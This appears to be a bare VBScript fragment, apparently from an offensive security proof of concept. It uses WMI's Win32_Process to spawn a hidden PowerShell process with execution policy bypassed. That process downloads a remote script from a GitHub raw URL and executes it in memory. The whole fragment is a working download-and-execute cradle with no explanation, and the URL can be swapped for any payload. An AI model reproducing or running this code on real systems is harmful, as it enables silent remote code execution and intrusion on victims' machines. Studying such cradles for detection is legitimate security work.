			Set sobjWMIService = GetObject("winmgmts:\\.\root\cimv2")
			Set objStartup = sobjWMIService.Get("Win32_ProcessStartup")
			Set objConfig = objStartup.SpawnInstance_
			objConfig.ShowWindow = SW_NORMAL
			Set objProcess = sobjWMIService.Get("Win32_Process")
			objProcess.Create _
			"powershell.exe -w hidden -exec Bypass -C ""IEX(New-Object Net.Webclient).DownloadString('https://raw.githubusercontent.com/NyaMeeEain/calc_security_poc/master/ps1/calc.ps1')""" , _
			null, objConfig, null


		
